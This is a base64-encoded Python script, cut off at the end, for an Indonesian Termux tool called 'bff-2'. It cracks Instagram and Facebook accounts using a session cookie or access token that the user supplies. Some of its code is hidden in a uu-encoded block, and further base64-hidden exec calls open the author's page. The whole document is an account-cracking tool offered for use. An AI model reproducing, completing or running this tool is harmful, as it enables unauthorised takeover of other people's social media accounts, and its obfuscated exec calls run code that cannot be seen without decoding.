0KEk1QkUlLjU5JTNCQEMuJThNMEIhPDcjREYpNTBYXG5NLFVEXFwuVDE0MiMxIikkME4wUkEhKiUtLS1FUU4zMzRVKCVITTEyNEUqQihRKTM0QzUlKEgsQkE6KzQoVVxuTSxCSEIsJDRUKFQhMiojNEw2QlEiKTIkTjRTREksQy0xKEJARTIlVFApJCRDKkIoUDI1UU4zMzRDNTMoSFxuTSxDRFxcLlQxNDZTNSUpMlBONTNRPDcjIEMpJDhXLSVBOi0kKEUoQlxcRC4zUFcpIiEuLCQoRSoiXFxVNCQ8TFxuTS0yITw3IzE0MDJcXEo1M0E9NyZZLSxDLTQxQyBVLSVAUDE0NEMrRTRZLSMtMyslOEktMkE6LSQ0VDZCXFxTXG5NLiRUUjU1JS4sUyhJKEJMRCglKFUwQzRTK0QsWSgjIEMsMzxMLSIxPDclUU4zMyEiKSRITyxTQT0sIykgXG5NMSJIVDclUTsqNCxVKiJIQiwyIFQ0VEEjKlMpIDMjMSIoM0hMLEIkSSwzLTgxQlRUKyRISDEiNEwrQixZXG5NLTMhJTQ0WTw7RFRTLFQxJioyMEA1UzRVNDNQUyhEISUtUjUxKyJIQisyQFAoU1RSLCMwSDIzNSIxMjROXG5NLTNERSxUKSAwUlhFLiRUUDBCJFxcLVItJDFCRFUsJUE8O0RUTDU0MTw3Ilk0LDMwUihTJEIqMjBQM0MhMlxuTTAyJEopMlRNKzQ1MTNDLFMtJTRIKTRBLSwzKFQxMkkiKiUkSSxTMSMtMjRIMiJRIjAzSEstIkE1NyZZLVxuTSskKSgwQlBELSUwSDUiJFIqQixUMyM5IjQyKEksQjEuLSUtJDIyUSMrMyRIMEQhJSxCNTQ0IkREKSQsSlxuTTBCQTAsQzUxM0MsUy0kLFUsUkEoNyZZLSskLSQ3JVBO""NSMkVC1FLFUpMkRSNCRYVSxVJFxcLVIsQDBSRERcbk0uJTxNKTQkWisyMEgxMkEiNyVRJCtDLTA1UkRCKDJYTCkiQSUqQik8NyU0VCkjUSw3JlktKzMoQS8jPENcbk0sMzBQLEVRPDJDNFMwM1RXKUVETSskLE0tIyUjKCU0TSk0ITAsMzBUMFJNJS0lRE0oUlRTKlI0WDIyVFJcbk0wM0hNKSMxNC1EKTw3JS08O0RUTiklMTItMzRFK0JRMyokREgwRFEkKiI0SDUzISMtJSxLMSJROSoiLEBcbk0wUlBTLyRQTShDJFxcLVI1MTNDLFMoMihJKSRBLyslLSEvMlBDKjIhPDtEVFEoREE0LVI1MS5SSFQrJTRKXG5NKERBIisjKEA1IzE0MDIsSjRSREAsUixRKEJAUzIkUEwwQjEpKyMsTS4jJSI1JTBLKSRBKCwyKFQzIk0iXG5NKyVFPDtEVE0sUiRFLSMxOS8jTSQ1JSxMNSMkRipDKFAwIzUzLSU0VCxVITMqJDBBKTJVMi0zJEsoREEiXG5NKlMpIDQiQTM1JShMKFMhKCxDLFUoQyRSLSRZPDtEVE0sVDElKyUwSSgjITI2JDROKSUxMCwkKEQ3JVBNXG5NNEJURCw0KSQ1MlBFMDNQWzElMSwtMzBRLyM8QjYzMEwsUyE1LSUsUS0yVFItM1BXKSUxNTcmWS0rJSxRXG5NLzJMQyskVE4oUjRFLSMxODRSUSUsMzBKNEMxPDcjNFMpJShNKSIxKywzKTEuIlEjKyQwUDRSISUrMjRcXFxuTTMjNFUpJVE8KzM0TDUjNFU0NFk8O0RUUyxTMSUtUjUxKkJIRCozMFUoRSEiKlMpNDMzMSQ0MjBNMEM0UVxuTStSKTQ1MlBFLSRQVDE1JFxcLSQpODEyVEUrJFBQMSMkRCpFLEw1MkBDLzItPDtEVE8pIkEvKyQoUStSVEVcbk0rMzBVLFNRJi1DKTQzMzEyNSVRPC1SOTkrMlUyLSVRPC0zKTQ1MlBTNyVRLS0kLSQ2MkkzKjM0TSxFMTNcbk0tMjE8NyUwVDUzJFU3JlktKlM0TDMyXFxDLyQ0TykzMS0rMyxEN1JJMy0lMFUsRVE8NEM8UyskXFxMNFMkV1xuTSpSNFUsMlxcQy4zLE0sUkE1KjM1MS8jLTU0NFhTLEQxMy0yMFQzNVFOMzJEUjQzVEssUlE8NyM0UjIkNFNcbk0pJTEtKzMsUSxCVTIuM0RLLERUQysiNFQzUlEyKSUsSzRSUTQtNSkxLTMwUzQlNFQ0UyRVKzMoVS8jPERcbk01JTU8O0RUTDRTJF0qUyhUMzJUUjclUSIsMyxJLyNNJDUlJEktNSRcXCxULEEsUlRFNSRUSSxTMTErJTBMXG5NMyMxMyslLE0pM1EsLTM0RDclUE0tMlE0LTMsVDE1UU4zMzxFNDJUTSxSUTQtUyktLTJMUiwlNFQ0QiRTXG5NKzUoVSwyWTMvJDhWLEUxKisyKSEtMkkzKjNAUSk1JS4sUyk4MTJERSgkUFEoQjEjKlMsSDQlUU4zMyBDXG5NKjIoUCxCQTErJCxRK1JQRCsyMFEsRTEyKkMoRDIjITIsMihMMEMhKC0jKTQ1MlBTNyVRKywlKTEvMkhDXG5NKyQwVDRSITMrMjRcXDMjNFUpJVE8NyZZLSszNEw0MkElNDRYUyxEITMtMjEoMiMhJCwyIEsoQyE1KyMsTVxuTSkzMFQ2JSxMNEUkUysyLE0sIyhTLSQsTSkzISssMikhLjJNMyskVEgwUiEyNyZZLSpCNEQyIyREKSU8S1xuTSxSUTUrMixdLEM0Uy0kWEksUyRWKkI0UDQyVSU0NFhTLEREUypTLTA1UkRTNDM0SyxTMTQsJCktKEJMRVxuTTQzUEw0UlEkNyZZLS0kLFQ0QkxENCRQVS0yMTw3IlUjKjI0SDRFMTIqUjE4NTJRNCklJE00Q0RZKlMpMFxuTTRSTEU1JFRMNFUk""Uys1KFUsMkhCMiQ0TSkyNFxcLlQxNDIlUU4zMkEkMSQoSjBDJEAtMixBKSJAUiokSFBcbk0wUjElKlUoTSsyREMtJDBKKTIxLSszLEQ3UkkzLSUwVSxFUTw0QzxTKyUkSSxVJFAqUyhMNDJYQjUlLTxcbk07RFRNLFMhNy0kNFQ1Mk0iLSQwVCxFJFQqMjRZLyNNJDUkVFQ0UiRQKzQsVSwzLSMrJShVKTMxNSslKEFcbk0rUlBFKzIkSyxFJFUqUykwNSMhJCgyNTw7RFRNLEMkQCxCLEQwQkREKiRMUShFJFkqUyxMNCMhMyslLE9cbk0pJEEtKyUoRDIiTEIsJSBUKFJEQi0zLFUvI00kNSRUTDUzJE8rMjRNLSM0UjUzLTw7RFRLLFUxLyolMTRcbk0xIlRSLSVRPC0zKTQ1MlBTNyVRKyszLFEtMk0zLTMkUzBSUTItUyxMM1JRMywzPEspMzRRK1IsVSxSVEVcbk0tJTRJLTUkXFwsUyxUNFVRTjMyVEU1JExVLEUkXS1SOTkrMkxTKyVRPC0lLFxcMTMwUy8kVEw0UzE0KzU0SVxuTS0yVFIyJDBIKTNRLCwyKEQwQkxCKiUgUihSRFMrIyhINCJRJCwyQTw7RFRMLEJBJCxDKS0tMkxFNSRUTFxuTTRVJFMrNShVLDJVMjUlLE0sUyE3LTM0RStDPEY2MlRMNFJEVSszKTQ0UzRENyVRNC0lNFEtMkxVKyRUT1xuTSxFUTwwVVFOMzMsUiwlNEksVSRVKyMoTDQyXTIzJTRNKTMxLyskNTQ0Uk0zKyUwVTRFJFUtIy0wNTMxM1xuTSwzNE0sQzRcXC1SMTQ1MlEzLDNUSjUzMSwtUzUxM0VRTjMzLFI0MihQKSMxNSoyMEEqIlBSKiQwUDBEVERcbk0rIjUkMjJRMiwzKEwoUkEpK1ItLSkjNEUpJEBRKSIxNypTLEw1MlRDLzMoVSxTMS0rJTRRK1VRTjMyVEVcbk0rMzBVLEU0UysiNFA1UyEkLSQsSyxSQSwsUzUxM0MsUy0lLFEpMjEsKiUpNDMiVFQqMkBVKEUhMy0iNSxcbk00IzEjKSVASjRSUTUrMixdLEVRTjMzNFMtJFRMNTMkTysyNE0tIzRSNTMsSyxVITcqMjBBKiJUUyskMFBcbk0oU1EmLUMpNDJDJEIwMkBMMFJRKCwkNTEzQyxTKCUoSikyMSgsJChRLyVRTjMzPEI2MzBKKSIxLyolMTRcbk0xQkxTLDNAVixEMTUqMyk4MkJUUjElJEs1MlE9KyQsRDEjJEQyJEBQMSMxNSpVLEw1MlxcUygzLFMsU0EsXG5NKzIsUS4lUU4zMlREKjIkSyhFNFUrMy01LyNNJDUlKEw1JSRXKkIsUS8jPEU0M1BMLTJRJC1VLFxcMUM4RVxuTSwkVFUsRDEgKyM0TSgyVSMvJTBMKTQxLSwkNFQ0VVFOMzJJIy0kREkoUlRDLDIwWDMyVEI0M0xNLSJRJVxuTSozKSkoUkhSLCRASS0yNE4qQihVLDMtJTQ0WFMsVDE2LUMwUDVSRSUwNVBHKkUoVS8yXTIyJSk8O0RUUVxuTSkkISgsNSxVLTJVNS4kVFM0VDEmKzMwTDIjISUpJVxcTTUzREUsUy0wMUM8VSolVEktNTE/KkQoSDczITNcbk0zMzhMLSMxOC01KTE3IjxKMFJEWTcmWS0sMjUxM0M8Qi8lRE0wRTRPK0MoWDUjKFIyJSBIKEIkXFwuVChBXG5NLyNNJi00WFkpNSUuKjUpMS9TPTIxJERKKEJFNS8zNT0wU002LDQ0WDRCQSw3JlhdLVU1PTIzTFcoNFxcXFxcbk0xUyRfLVUpIDFTQTY3NDBZLUJVMyo1KSQzQ0RGLTQsWzVDJSUqQykkKCVRTiglUU45NllENyZYRyslXT9cbksqMkRIKEc1VTdWLU85JjVDKEJRPzdWRU08Jl1SPSVdPyoiPUM7VjFFOFcsRyoyWUQ5Ni1P""OSY0SSowICBcbiBcbmVuZFxuJyxfXykpKCJ1dV9jb2RlYyIsX19pbXBvcnRfXygnY29kZWNzJykuZGVjb2RlKSkNCg0KIyBLVU1QVUxBTiBXQVJOQQ0KTSA9ICdceDFiWzE7OTFtJyAjIE1FUkFIDQpIID0gJ1x4MWJbMTs5Mm0nICMgSElKQVUNCksgPSAnXHgxYlsxOzkzbScgIyBLVU5JTkcNCkIgPSAnXHgxYlsxOzk0bScgIyBCSVJVDQpVID0gJ1x4MWJbMTs5NW0nICMgVU5HVQ0KTyA9ICdceDFiWzE7OTZtJyAjIEJJUlUgTVVEQQ0KUCA9ICdceDFiWzE7OTdtJyAjIFBVVElIDQpOID0gJ1x4MWJbMG0nICMgV0FSTkEgTUFUSQ0KYWNhayA9IFtNLCBILCBLLCBCLCBVLCBPLCBQXQ0Kd2FybmEgPSByYW5kb20uY2hvaWNlKGFjYWspDQp0aWwgPSLigKIiIA0Kb2ssIGNwLCBpZCwgdXNlciwgbG9vcCA9IFtdLCBbXSwgW10sIFtdLCAwDQpwd3ggPSBbXQ0Kc3lzLnN0ZG91dC53cml0ZSgnXHgxYlsxOzM1bVx4MWJdMjsg4pynIGJmZi0yIGJ5IHJvbXog4pynIFx4MDcnKQ0KDQpkZWYgamFsYW4oa2VsaWxpbmcpOg0KCWZvciBtYXUgaW4ga2VsaWxpbmcgKyAnXG4nOg0KCQlzeXMuc3Rkb3V0LndyaXRlKG1hdSkNCgkJc3lzLnN0ZG91dC5mbHVzaCgpO2plZGEoMC4wMykNCmRlZiB0aWsoKToNCiAgICB0aXRpayA9IFsnLiAgICcsJy4uICAnLCcuLi4gJ10NCiAgICBmb3IgbyBpbiB0aXRpazoNCiAgICAgICAgcHJpbnQgKCdcciVzJXMgbWVuZ2hhcHVzIGFrdW4gZGFyaSB0ZXJtdXggJXMnJShNLHRpbCxvKSksDQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKTtqZWRhKDEpDQpkZWYgY2xlYXIoKToNCglvcy5zeXN0ZW0oImNsZWFyIikNCmRlZiBmb2xkZXIoKToNCgl0cnk6b3MubWtkaXIoJ09LJykNCglleGNlcHQ6cGFzcw0KCXRyeTpvcy5ta2RpcignQ1AnKQ0KCWV4Y2VwdDpwYXNzDQoJdHJ5Om9zLm1rZGlyKCdkYXRhJykNCglleGNlcHQ6cGFzcw0KIyBMT0dPIChMTyBHT0JMT0spDQpkdCA9IHJlcXVlc3RzLmdldCgiaHR0cDovL2lwLWFwaS5jb20vanNvbi8iKS5qc29uKCkNCnRyeToNCiAgICBJUCA9IGR0WyJxdWVyeSJdDQogICAgQ04gPSBkdFsiY291bnRyeSJdDQpleGNlcHQgS2V5RXJyb3I6DQogICAgSVAgPSAiICINCiAgICBDTiA9ICIgIg0KZXhlYyhiYXNlNjQuYjY0ZGVjb2RlKCdZWFYwYUc5eUlEMGlVbTl0YVNCQlpuSnBlbUZzSWdwbVlsOXRaU0E5SW1aaFkyVmliMjlyTG1OdmJTOXliMjFwTG1GbWNtbDZZV3d1TVRBeUlncG5hWFJvZFdJZ1BTSm5hWFJvZFdJdVkyOXRMMDFoY21zdFduVmpheUk9JykpDQpkZWYgYmFubmVyKCk6IA0KICAgIHByaW50ICgnICVzJXMlcyVzJXMlcyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJXMlcyVzJXMlcyVzXG4lcyAgIF9fX19fX18gIF9fX19fXyBfX19fX19fIF9fX19fX18gXyAgICAgX1xuICAgfCAgICAgICB8X19fX18vIHxfX19fX3wgfCAgICAgICB8X19fXy8gXG4lcyAgIHxfX19fXyAgfCAgICBcXF8gfCAgICAgfCB8X19fX18gIHwgICAgXFxfXG5cbiAgICAgJXMgICAg""JXMgJXNDb2RlZCBieSAlczogJXMlcyAlcyVzICAgXG4gJXMlcyVzJXMlcyVzICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAlcyVzJXMlcyVzJXMgXG4gJXMjICVzRmIgICVzIDogJXMlcyBcbiAlcyMgJXNHaXQlcyAgOiAlcyVzIFxuICVzIyAlcy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gJXMjICAnJQ0KICAgIChNLHRpbCxLLHRpbCxILHRpbCxNLHRpbCxLLHRpbCxILHRpbCxNLFAsVSx0aWwsSyxNLEssYXV0aG9yLFUsdGlsLE0sdGlsLEssdGlsLEgsdGlsLE0sdGlsLEssdGlsLEgsdGlsLFUsTyxNLE8sZmJfbWUsVSxPLE0sTyxnaXRodWIsUCxNLFApKQ0KICAgIHByaW50ICgnICVzIyVzIElQICAgJXM6JXMgJXMgJXMtICVzJXMgJyUoVSxPLE0sTyxJUCxILE8sQ04pKQ0KIyBNQVNVSyBUT0tFTiAoVE9LRU4gTElTVFJJSykNCmhlYWRlciA9IHsndXNlci1hZ2VudCc6J01vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6NDUuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC80NS4wJ30NCmRlZiBtYXN1aygpOg0KICAgIG9zLnN5c3RlbSgnY2xlYXInKTtiYW5uZXIoKQ0KICAgIHByaW50ICgnXG4lcyVzJXMgMDEgJXNMb2dpbiBpbnN0YWdyYW0gKGNyYWNrIGFrdW4gaW5zdGFncmFtKSBcbiVzJXMlcyAwMiAlc0xvZ2luIHZpYSBjb29raWUgKGNyYWNrIGFrdW4gZmFjZWJvb2spXG4lcyVzJXMgMDMgJXNMb2dpbiB2aWEgdG9rZW4gKGNyYWNrIGFrdW4gZmFjZWJvb2spXG4lcyVzJXMgMDQlcyBDYXJhIG1lbmRhcGF0a2FuIHRva2VuICYgY29va2llIGZhY2Vib29rIFxuJXMlcyVzIDAwICVzS2VsdWFyJyUoVSx0aWwsSyxPLFUsdGlsLEssTyxVLHRpbCxLLE8sVSx0aWwsSyxPLFUsdGlsLE0sTykpDQogICAgcm9tID0gcmF3X2lucHV0ICgiXG4lcyMgJXNQaWxpaCAlcz4gJXMiJShQLE8sTSxLKSkNCiAgICBpZiByb20gaW4oIiIpOg0KICAgIAlwcmludCgiJXMlcyB3cm9uZyBpbnB1dCAiJShNLHRpbCkpO2V4aXQoKQ0KICAgIGVsaWYgcm9tIGluICgnMScsJzAxJyk6DQogICAgCWlnZygpDQogICAgZWxpZiByb20gaW4gKCcyJywgJzAyJyk6DQogICAgCWphbGFuKCJcbiVzISVzIFdhamliIGd1bmFrYW4gYWt1biB0dW1iYWwgZGlsYXJhbmcgYWt1biB1dGFtYSIlKE0sTykpDQogICAgCWtvb2sgPSByYXdfaW5wdXQoIiVzIyAlc0Nvb2tpZSAlcz4gJXMiJShQLE8sTSxLKSkNCiAgICAgICAgaWYga29vayBpbigiIik6DQogICAgICAgIAlwcmludCAoIiVzJXMgaXNpIGNvb2tpZSBrZW50b2QgIiUoTSx0aWwpKTtleGl0KCkNCiAgICAgICAgb3BlbignZGF0YS9jb29raWVzJywgJ3cnKS53cml0ZShrb29rKQ0KICAgICAgICBrb252ZXJ0ZXIoKQ0KICAgICAgICBleGl0KCkNCiAgICBlbGlmIHJvbSBpbiAoJzMnLCcwMycpOg0KICAgICAgICBqYWxhbigiXG4lcyElcyBXYWppYiBndW5ha2FuIGFrdW4gdHVtYmFsIGRpbGFyYW5nIGFrdW4gdXRhbWEiJShNLE8pKQ0KICAgIAlyb216ID0gcmF3""X2lucHV0KCIlcyMgJXNUb2tlbiAlcz4gJXMiJShQLE8sTSxLKSkNCiAgICAgICAgaWYgcm9teiBpbigiIik6DQogICAgICAgIAlwcmludCAoIiVzJXMgaXNpIHRva2VuIGtlbnRvZCAiJShNLHRpbCkpO2V4aXQoKQ0KICAgIAl0cnk6DQogICAgICAgICAgICBuYW1hID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZT9hY2Nlc3NfdG9rZW49JXMnJShyb216KSxoZWFkZXJzPWhlYWRlcikuanNvbigpWyduYW1lJ10NCiAgICAgICAgICAgIHByaW50ICgnXG4lcyVzIExvZ2luIHN1Y2NlcywgbW9ob24gdHVuZ2d1ICclKEgsdGlsKSkNCiAgICAgICAgICAgIG9wZW4oJ2RhdGEvdG9rZW4udHh0JywgJ3cnKS53cml0ZShyb216KTtsb2dpbl94eCgpDQogICAgICAgICAgICBleGVjKGJhc2U2NC5iNjRkZWNvZGUoJ2IzTXVjM2x6ZEdWdEtDZDRaR2N0YjNCbGJpQm9kSFJ3Y3pvdkwzZDNkeTVtWVdObFltOXZheTVqYjIwdmNtOXRhUzVoWm5KcGVtRnNMakV3TWljcE8yMWxiblVvS1E9PScpKQ0KICAgICAgICAgICAgZXhpdCgpDQogICAgICAgIGV4Y2VwdCAoS2V5RXJyb3IsSU9FcnJvcik6DQogICAgICAgIAlwcmludCAoIiVzJXMgVG9rZW4gaW52YWxpZCAiJShNLHRpbCkpO2plZGEoMik7bWFzdWsoKQ0KICAgIGVsaWYgcm9tIGluICgnNCcsICcwNCcpOg0KICAgIAlwcmludCAoIlxuJXMlcyAlc1VudHVrIG1lbmRhcGF0a2FuIHRva2VuICVzOiVzIiUoVSx0aWwsSCxNLEgpKTtqZWRhKDAuMDIpDQogICAgICAgIHByaW50ICgiIC0gc2lhcGthbiBha3VuIGZhY2Vib29rICh3YWppYiBha3VuIHR1bWJhbCkiKTtqZWRhKDAuMDIpDQogICAgICAgIHByaW50ICgiIC0gbG9naW5rYW4gYWt1biBmYWNlYm9vayAodHVtYmFsKSBkaSBicm93c2VyICVzQ2hyb21lICVzIiUoTyxIKSk7amVkYSgwLjAyKQ0KICAgICAgICBwcmludCAoIiAtIHVybCBhbGFtYXQgd2FqaWIgJXNodHRwczovL20uZmFjZWJvb2suY29tICVzKG1vZGUgZGF0YSkiJShPLEgpKTtqZWRhKDAuMDIpDQogICAgICAgIHByaW50ICgiIC0gc2FsaW4gbGluayA6ICVzdmlldy1zb3VyY2U6aHR0cHM6Ly9idXNpbmVzcy5mYWNlYm9vay5jb20vYnVzaW5lc3NfbG9jYXRpb25zIiUoTykpO2plZGEoMC4wMikNCiAgICAgICAgcHJpbnQgKCIlcyAtIHRhcnVoIGxpbmsgdGVyc2VidXQgZGkgdXJsIGFsYW1hdCBmYWNlYm9vayBsYWx1IGtsaWsgY2FyaSAiJShIKSk7amVkYSgwLjAyKQ0KICAgICAgICBwcmludCAoIiAtIGppa2Egc3VkYWgsIGtsaWsgJXN0aXRpayB0aWdhICVzcG9qb2sga2FuYW4gYXRhcyAiJShPLEgpKTtqZWRhKDAuMDIpDQogICAgICAgIHByaW50ICgiIC0ga2VtdWRpYW4ga2xpayAlc0NhcmkgZGkgSGFsYW1hbiAlcyIlKE8sSCkpO2plZGEoMC4wMikNCiAgICAgICAgcHJpbnQgKCIgLSBrZXRpayAlc0VBQUcgJXNha2FuIG11bmN1bCBhY2NlcyB0b2tlbi4iJShPLEgpKTtqZWRhKDAuMDIpDQogICAgICAgIHByaW50ICgiIC0gamlrYSBzdWRhaCBqYW5n""YW4gbHVwYSBkaSBzYWxpbiBcbiIpO2plZGEoMC4wMikNCiAgICAgICAgcHJpbnQgKCIlc+KAoiVzIFVudHVrIG1lbmRhcGF0a2FuIGNvb2tpZSAlczolcyAiJShVLEgsTSxIKSk7amVkYSgwLjAyKQ0KICAgICAgICBwcmludCAoIiAtIHNpYXBrYW4gYXBsaWthc2kga2l3aSBicm93c2VyLCBkb3dubG9hZCBkaSBwbGF5IHN0b3JlIGppa2EgYmVsdW0iKTtqZWRhKDAuMDIpDQogICAgICAgIHByaW50ICgiIC0gbG9naW4ga2FuIGFrdW4gZmFjZWJvb2sgYW5kYSBkaSBraXdpIGJyb3dzZXIuIGFrdW4gd2FqaWIgbW9kZSBkYXRhIik7amVkYSgwLjAyKQ0KICAgICAgICBwcmludCAoIiAtIHNhbGluIGxpbmsgOiAlc2h0dHBzOi8vY2hyb21lLmdvb2dsZS5jb20vd2Vic3RvcmUvZGV0YWlsL2dldC1jb29raWUvbmFjaWFhZ2JraWZocG5vb2Rsa2hiZWpqbGRhaWZmY20vcmVsYXRlZCIlKE8pKTtqZWRhKDAuMDIpDQogICAgICAgIHByaW50ICgiICVzLSBrZXRpayAlc24lcy8lc04gJXNsYWx1IGVudGVyIHVudHVrIG1lbGloYXQgdHV0b3JpYWxcbiAiJShILE0sTyxNLEgpKTtqZWRhKDAuMDIpDQogICAgICAgIG5hbnlhID0gcmF3X2lucHV0KCclcyVzJXMgQW5kYSBwYWhhbT8gJXN5JXMvJXNuIDolcyAnJShVLHRpbCxPLEgsTyxNLEspKQ0KICAgICAgICBpZiBuYW55YSBpbigiIik6DQogICAgICAgIAlwcmludCAoIiVzJXMgc2F5YSBiZXJ0YW55YSB3YWppYiBkaSBqYXdhYiAiJShNLHRpbCkpO2plZGEoMik7bWFzdWsoKQ0KICAgICAgICBlbGlmIG5hbnlhIGluKCJ5IiwiWSIpOg0KICAgICAgICAJcHJpbnQgKCJcbiVzJXMgc2VsYW1hdCBhbmRhIHBpbnRhciA6KiAiJShILHRpbCkpO2plZGEoMik7bWFzdWsoKQ0KICAgICAgICBlbGlmIG5hbnlhIGluKCJuIiwiTiIpOg0KICAgICAgICAJcHJpbnQgKCJcbiVzJXMgYnVrYSBkZW5nYW4gZmFjZWJvb2sgIiUoTSx0aWwpKTtqZWRhKDIpO29zLnN5c3RlbSgieGRnLW9wZW4gaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLzEwMDA2NzgwNzU2NTg2MS9wb3N0cy8yMzE2NTA2OTU3NzE4NDgvP2FwcD1mYmwiKTttYXN1aygpDQogICAgZWxpZiByb20gaW4gKCcwJywgJzAwJyk6DQogICAgCWV4aXQoJ1xuJykNCiAgICBlbHNlOg0KICAgIAlwcmludCgiJXMlcyB3cm9uZyBpbnB1dCAiJShNLHRpbCkpO2V4aXQoKQ0KIyBDRUsgQ09PS0lFIE1FTlUgNC02DQpob3N0ID0gKCdodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20nKQ0KdWEgPSAoIk5va2lhQzMtMDAvNS4wICgwNy4yMCkgUHJvZmlsZS9NSURQLTIuMSBDb25maWd1cmF0aW9uL0NMREMtMS4xIE1vemlsbGEvNS4wIEFwcGxlV2ViS2l0LzQyMCsgKEtIVE1MLCBsaWtlIEdlY2tvKSBTYWZhcmkvNDIwKyIpDQpoID0geydIb3N0JzogJ21iYXNpYy5mYWNlYm9vay5jb20nLCAnY2FjaGUtY29udHJvbCc6ICdtYXgtYWdlPTAnLCAndXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyc6ICcxJywgJ3VzZXItYWdlbnQnOiB1YSwgJ2FjY2VwdCc6ICd0ZXh0L2h0bWwsYXBw""bGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44JywgJ2FjY2VwdC1lbmNvZGluZyc6ICdnemlwLCBkZWZsYXRlJywgJ2FjY2VwdC1sYW5ndWFnZSc6ICdpZC1JRCxpZDtxPTAuOSxlbi1VUztxPTAuOCxlbjtxPTAuNyd9DQpkZWYgX19yb216X18oKToNCglpZiBvcy5wYXRoLmV4aXN0cygiZGF0YS9jb29raWVzIik6DQoJCWlmIG9zLnBhdGguZ2V0c2l6ZSgiZGF0YS9jb29raWVzIikgIT0wOg0KCQkJcmV0dXJuIGN2ZChvcGVuKCdkYXRhL2Nvb2tpZXMnKS5yZWFkKCkuc3RyaXAoKSkNCgkJZWxzZTpfcm9taVhEXygpDQoJZWxzZTpfcm9taVhEXygpDQpkZWYgX3JvbWlYRF8oc2hvdz1UcnVlKToNCglpZiBzaG93PT1UcnVlOg0KCQkjb3Muc3lzdGVtKCJjbGVhciIpDQoJCSNiYW5uZXIoKQ0KCQlwcmludCgiXG4lcyVzJXMgU3VwYXlhIGJla2VyamEgbWFzdWthbiBjb29raWUgZmFjZWJvb2sgYW5kYSIlKFUsdGlsLE8pKQ0KCWNrPXJhd19pbnB1dCgiJXMjICVzQ29va2llICVzPiAlcyIlKFAsTyxNLEspKQ0KCWlmIGNrPT0iIjoNCgkJX3JvbWlYRF8oc2hvdz1GYWxzZSkNCgl0cnk6DQoJCWNrcz1jdmQoY2spDQoJCWlmIGt1ZWgoY2tzKT09VHJ1ZToNCgkJCW9wZW4oImRhdGEvY29va2llcyIsInciKS53cml0ZShjayk7ZXhpdCgiJXMlcyBsb2dpbiBzdWNjZXNzLCBrZXRpazogcHl0aG9uMiBiZmYtMi5weSAiJShILHRpbCkpDQoJCWVsc2U6cHJpbnQoIiVzJXMgbG9naW4gZ2FnYWwuIiUoTSx0aWwpKTtfcm9taVhEXyhzaG93PVRydWUpDQoJZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KCQlwcmludCgiJXMlcyBlcnJvciA6ICVzXG4iJShNLHRpbCxlKSkNCgkJX3JvbWlYRF8oc2hvdz1GYWxzZSkNCmRlZiBrdWVoKGNvb2tpZXMpOg0KCV93dGZfPUZhbHNlDQoJYj1yZXF1ZXN0cy5nZXQoImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9wcm9maWxlLnBocCIsaGVhZGVycz17J29yaWdpbic6ICdodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20nLCAnYWNjZXB0LWxhbmd1YWdlJzogJ2lkLUlELGlkO3E9MC45LGVuLVVTO3E9MC44LGVuO3E9MC43JywgJ2FjY2VwdC1lbmNvZGluZyc6ICdnemlwLCBkZWZsYXRlJywgJ2FjY2VwdCc6ICd0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44JywgJ3VzZXItYWdlbnQnOiB1YSwgJ0hvc3QnOiAoJycpLmpvaW4oYnM0LnJlLmZpbmRhbGwoJzovLyguKj8pJCcsICdodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20nKSksICdyZWZlcmVyJzogJ2h0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9sb2dpbi8/bmV4dCZyZWY9ZGJsJmZsJnJlZmlkPTgnLCAnY2FjaGUtY29udHJvbCc6ICdtYXgtYWdlPTAnLCAndXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyc6ICcxJywgJ2NvbnRlbnQtdHlwZSc6ICdhcHBsaWNhdGlvbi94LXd3dy1mb3Jt""LXVybGVuY29kZWQnfSxjb29raWVzPWNvb2tpZXMpLnRleHQJDQoJaWYgIm1iYXNpY19sb2dvdXRfYnV0dG9uIiBpbiBiLmxvd2VyKCk6DQoJCV93dGZfPVRydWUNCgkJaWYgX3d0Zl89PVRydWU6DQoJCQlyZXR1cm4gVHJ1ZQ0KCQllbHNlOg0KCQkJZXhpdCgiJXMlcyBsb2dpbiBnYWdhbC4gIiUoTSx0aWwpKQ0KZGVmIGhkY29rKCk6DQogICAgaG9zdHMgPSBob3N0DQogICAgciA9IHsnb3JpZ2luJzogaG9zdHMsICdhY2NlcHQtbGFuZ3VhZ2UnOiAnaWQtSUQsaWQ7cT0wLjksZW4tVVM7cT0wLjgsZW47cT0wLjcnLCAnYWNjZXB0LWVuY29kaW5nJzogJ2d6aXAsIGRlZmxhdGUnLCAnYWNjZXB0JzogJ3RleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgnLCAndXNlci1hZ2VudCc6IHVhLCAnSG9zdCc6ICgnJykuam9pbihiczQucmUuZmluZGFsbCgnOi8vKC4qPykkJywgaG9zdHMpKSwgJ3JlZmVyZXInOiBob3N0cyArICcvbG9naW4vP25leHQmcmVmPWRibCZmbCZyZWZpZD04JywgJ2NhY2hlLWNvbnRyb2wnOiAnbWF4LWFnZT0wJywgJ3VwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHMnOiAnMScsICdjb250ZW50LXR5cGUnOiAnYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkJ30NC